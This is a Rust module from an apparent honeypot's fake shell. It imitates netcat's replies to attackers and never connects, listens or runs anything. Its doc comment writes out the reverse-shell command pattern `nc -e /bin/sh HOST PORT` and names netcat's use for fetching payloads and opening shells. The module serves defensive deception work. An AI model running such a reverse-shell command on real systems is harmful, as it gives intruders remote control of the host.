//! `nc`: the netcat attackers use to fetch payloads and to open reverse and bind shells
//! (`nc -e /bin/sh HOST PORT`). Intent capture only.
//!
//! This module never opens a socket, resolves a name, reads a host resource or starts a process.
//! The `-e` / `-c` command is consumed as an option value and dropped: it is not stored, not
//! echoed and not dispatched, so nothing typed after it can run (the raw command line, command
//! included, is already on the sensor's `command_exec` event). A connect attempt is answered as
//! what a bot sees when the connection does not come up, a listen request as a listener that
//! returned, and a scan as every port closed. No reply carries more than the typed host and port,
//! clipped; no address from the connection or the deployment host is consulted.
//!
//! Which personas have `nc` is the recorded evidence, not this module's choice. The Ubuntu 22.04
//! recording has no `/usr/bin/nc` and no `netcat` (binaries table, 2026-09-29), so the bare name
//! is "command not found" there. Its BusyBox applet list does name `nc`, so `busybox nc` runs
//! this model. The phone ships toybox, which builds `nc` (`/system/bin/nc`, also reached as
//! `toybox nc` and `busybox nc`) [unverified: no Android capture exists]. `netcat` and `ncat`
//! are not modeled: absent on Ubuntu, and BusyBox has no such applet.
//!
//! The replies are composed from OpenBSD netcat's wording, not captured from either BusyBox or
//! toybox, so every one is [unverified]:
//!
//! * connect `nc [-w S] HOST PORT`: nothing connects, so status 1; silent, or under `-v`
//!   `nc: connect to HOST port PORT (tcp) failed: Connection refused` (`timed out: Operation now
//!   in progress` when `-w` names a timeout). A modeled timeout returns at once.
//! * `-u` connect: UDP has no handshake, so a silent success.
//! * `-l`: the listener "returns" silently with status 0 when a port was given (`-p PORT` or a
//!   bare operand), status 1 when none was. No port is bound.
//! * `-z` scan: every named port is closed, one line each under `-v`, status 1.
//!
//! A flag not modeled is accepted and ignored. Everything else (missing operands, a port that is
//! not a number) is silent with status 1.
#![deny(
    clippy::arithmetic_side_effects,
    clippy::unwrap_used,
    clippy::indexing_slicing
)]

use super::registry::Registry;
use super::{CommandResult, FakeShell, HandlerId, ShellFlavor};

pub(super) fn register(r: &mut Registry) {
    r.register_if("nc", has_nc, HandlerId::Nc, FakeShell::cmd_nc);
}

/// The phone has `nc` as a file; Ubuntu only as a BusyBox applet, so only under `busybox nc`
/// (`cmd_busybox` raises `busybox_depth` before it resolves the applet).
fn has_nc(shell: &FakeShell, _parts: &[&str]) -> bool {
    shell.flavor == ShellFlavor::AndroidSh || shell.busybox_depth > 0
}

/// The most command-line words one call examines.
const ARGS_MAX: usize = 64;
/// The longest host name any reply repeats.
const HOST_MAX: usize = 253;
/// The most ports a scan reports on.
const PORTS_MAX: usize = 16;
/// The longest port token read (`65535`, or a `-` range of two).
const PORT_TOKEN_MAX: usize = 11;
/// The short options that take a value, in this or the next word. `e` and `c` carry the shell
/// command a reverse shell hands over.
const TAKES_VALUE: &str = "pwsecIiqWTxXPO";

#[derive(Default)]
struct Plan {
    listen: bool,
    udp: bool,
    verbose: bool,
    scan: bool,
    /// `-w` named a timeout.
    timed: bool,
    /// A port to listen on was given, by `-p` or as an operand.
    listen_port: bool,
    host: Option<String>,
    ports: Vec<u16>,
}

/// Push the ports `token` names (`22` or `20-25`) onto `ports`, up to [`PORTS_MAX`]. False when
/// the token is not a port or range.
fn push_ports(token: &str, ports: &mut Vec<u16>) -> bool {
    if token.len() > PORT_TOKEN_MAX {
        return false;
    }
    let number = |text: &str| {
        let digits = !text.is_empty() && text.bytes().all(|b| b.is_ascii_digit());
        digits
            .then(|| text.parse::<u16>().ok())
            .flatten()
            .filter(|n| *n != 0)
    };
    let (first, last) = match token.split_once('-') {
        Some((a, b)) => (number(a), number(b)),
        None => (number(token), number(token)),
    };
    let (Some(first), Some(last)) = (first, last) else {
        return false;
    };
    if first > last {
        return false;
    }
    let room = PORTS_MAX.saturating_sub(ports.len());
    ports.extend((first..=last).take(room));
    true
}

fn parse(args: &[&str]) -> Plan {
    let mut plan = Plan::default();
    let mut operands: Vec<&str> = Vec::new();
    let mut words = args.iter().take(ARGS_MAX).copied();
    while let Some(word) = words.next() {
        // toybox's `-- COMMAND...`: the rest is a command, dropped like `-e`'s value.
        if word == "--" {
            break;
        }
        let Some(bundle) = word.strip_prefix('-').filter(|b| !b.is_empty()) else {
            operands.push(word);
            continue;
        };
        for (at, flag) in bundle.char_indices() {
            if TAKES_VALUE.contains(flag) {
                let attached = bundle.get(at.saturating_add(flag.len_utf8())..);
                let value = match attached {
                    Some(rest) if !rest.is_empty() => Some(rest),
                    _ => words.next(),
                };
                match flag {
                    'p' => {
                        plan.listen_port = value.is_some_and(|v| push_ports(v, &mut Vec::new()));
                    }
                    'w' => plan.timed = value.is_some(),
                    _ => {}
                }
                break;
            }
            match flag {
                'l' | 'L' => plan.listen = true,
                'u' => plan.udp = true,
                'v' => plan.verbose = true,
                'z' => plan.scan = true,
                _ => {}
            }
        }
    }
    if plan.listen {
        let mut scratch = Vec::new();
        if operands.last().is_some_and(|o| push_ports(o, &mut scratch)) {
            plan.listen_port = true;
        }
        return plan;
    }
    plan.host = operands.first().map(|host| printable(host));
    for token in operands.iter().skip(1) {
        if !push_ports(token, &mut plan.ports) {
            plan.ports.clear();
            break;
        }
    }
    plan
}

/// The host as a reply repeats it: graphic ASCII only, at most [`HOST_MAX`] bytes.
fn printable(host: &str) -> String {
    host.chars()
        .filter(char::is_ascii_graphic)
        .take(HOST_MAX)
        .collect()
}

impl FakeShell {
    /// `nc [options] HOST PORT`, `nc -l [-p] PORT`, `nc -zv HOST PORTS`. See the module doc for
    /// each reply. Nothing connects, listens or runs, whatever the arguments.
    pub(super) fn cmd_nc(&mut self, parts: &[&str]) -> CommandResult {
        let plan = parse(parts.get(1..).unwrap_or(&[]));
        if plan.listen {
            return CommandResult::silent(u8::from(!plan.listen_port));
        }
        let Some(host) = plan.host.filter(|_| !plan.ports.is_empty()) else {
            return CommandResult::silent(1);
        };
        if plan.udp {
            return CommandResult::silent(0);
        }
        if !plan.verbose {
            return CommandResult::silent(1);
        }
        let reason = if plan.timed {
            "timed out: Operation now in progress"
        } else {
            "failed: Connection refused"
        };
        // A plain connect uses the first port only; a scan reports each.
        let reported = if plan.scan { plan.ports.len() } else { 1 };
        let mut out = String::new();
        for port in plan.ports.iter().take(reported) {
            out.push_str(&format!(
                "nc: connect to {host} port {port} (tcp) {reason}\n"
            ));
        }
        CommandResult::stderr(1, out)
    }
}
